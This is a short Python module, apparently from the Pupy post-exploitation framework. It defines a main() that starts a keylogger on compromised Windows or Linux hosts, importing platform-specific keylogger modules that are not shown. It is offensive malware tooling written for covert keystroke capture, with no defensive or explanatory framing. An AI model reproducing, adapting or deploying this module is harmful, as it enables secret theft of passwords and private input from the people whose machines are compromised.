# -*- coding: utf-8 -*-

''' Start keylogger '''

__dependencies__ = {
    'windows': ['pupwinutils.keylogger', 'pupwinutils.hookfuncs'],
    'linux': ['pupyps', 'display', 'keylogger']
}

__compatibility__ = ('windows', 'linux')

if '__os:linux__':
    from keylogger import keylogger_start
    from display import when_attached

    def main():
        when_attached(keylogger_start)

elif '__os:windows__':
    from pupwinutils.keylogger import keylogger_start

    def main():
        keylogger_start()
